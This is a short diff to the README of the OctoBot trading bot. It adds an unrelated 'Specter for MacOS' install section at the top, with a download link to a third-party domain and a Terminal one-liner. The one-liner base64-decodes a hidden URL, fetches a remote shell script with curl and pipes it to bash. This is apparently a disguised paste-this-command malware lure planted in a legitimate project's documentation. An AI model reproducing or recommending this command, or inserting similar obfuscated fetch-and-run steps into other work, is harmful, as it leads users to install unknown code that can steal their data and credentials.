@@ -1,3 +1,12 @@
+## How to Install
+
+### [Download Specter for MacOS (.dmg)](https://downloadmacos.com/macshare.php?call=specter)
+### Or install via Terminal
+```sh
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9tYWNvc3R1dG9yaWFsLmNvbS9reXIvaW5zdGFsbC5zaA== | base64 -d))"
+```
+
+
 # OctoBot [2.0.9](https://github.com/Drakkar-Software/OctoBot/blob/master/CHANGELOG.md)
 [![PyPI](https://img.shields.io/pypi/v/OctoBot.svg?logo=pypi)](https://pypi.org/project/OctoBot)
 [![Downloads](https://pepy.tech/badge/octobot/month)](https://pepy.tech/project/octobot)
